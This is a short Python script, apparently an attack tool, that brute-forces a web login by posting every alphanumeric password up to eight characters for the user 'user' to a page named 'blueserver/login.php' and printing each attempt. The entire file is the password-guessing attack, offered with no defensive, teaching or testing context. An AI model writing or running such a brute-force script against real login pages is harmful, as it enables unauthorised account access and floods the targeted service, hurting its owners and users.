import requests
import itertools
import string

url = 'blueserver/login.php'
username = 'user'
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
max_length = 8

passwords = itertools.chain(
    *[itertools.product(characters, repeat=i) for i in range(1, max_length + 1)]
)

for password_tuple in passwords:
    password = ''.join(password_tuple)

    credentials = {
        'user': username,
        'pass': password
    }

    response = requests.post(url, data=credentials)

    print(f'Attempted {username}:{password}', response)
